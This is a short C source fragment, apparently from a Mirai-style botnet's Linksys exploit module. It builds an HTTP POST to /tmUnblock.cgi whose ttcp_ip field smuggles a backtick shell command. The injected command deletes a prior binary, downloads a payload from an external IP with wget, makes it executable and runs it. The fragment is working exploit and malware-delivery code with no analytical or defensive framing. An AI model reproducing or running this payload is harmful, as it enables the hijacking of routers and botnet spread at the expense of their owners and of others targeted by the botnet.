            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    if(conn->state == linksys_SC_EXPLOIT_STAGE2)
                    {
                        ...
                        util_strcpy(conn->payload_buf, "POST /tmUnblock.cgi HTTP/1.1\r\nHost: 127.0.0.1:80\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: /\r\nUser-Agent: B4ckdoor-owned-you-python-requests/2.20.0\r\nContent-Length: 227\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+Ares.mpsl%3B+wget+http%3A%2F%2F5.181.80.188%2Fbins%2Fsora.mpsl%3B+chmod+777+sora.mpsl%3B+.%2Fsora.mpsl+link.rep%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1");
